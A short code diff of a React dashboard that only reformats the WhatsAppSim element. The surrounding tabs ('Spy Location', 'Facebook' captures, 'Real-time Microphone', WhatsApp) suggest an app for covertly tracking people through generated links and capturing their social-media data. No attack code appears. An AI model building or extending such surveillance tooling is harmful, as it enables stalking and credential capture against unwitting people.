@@ -551,7 +551,13 @@ export default function Dashboard({ email }) {
             {active === 'Spy Location' && <><LinkGenerator /><LinksList /></>}
             {active === 'Facebook' && <><LinkGenerator onlyFacebook /><FacebookCaptures /></>}
             {active === 'Real-time Microphone' && <MicrophonePlaceholder />}
-            {active === 'WhatsApp' && <WhatsAppSim onBack={() => setShowLoadMoreMsg(false)} showLoadMoreMsg={showLoadMoreMsg} setShowLoadMoreMsg={setShowLoadMoreMsg} />}
+            {active === 'WhatsApp' && (
+              <WhatsAppSim
+                onBack={() => setShowLoadMoreMsg(false)}
+                showLoadMoreMsg={showLoadMoreMsg}
+                setShowLoadMoreMsg={setShowLoadMoreMsg}
+              />
+            )}
             {active !== 'Spy Location' && active !== 'Facebook' && active !== 'Real-time Microphone' && active !== 'WhatsApp' && (
               <div style={{
                 background: 'var(--fundo-destaque)',
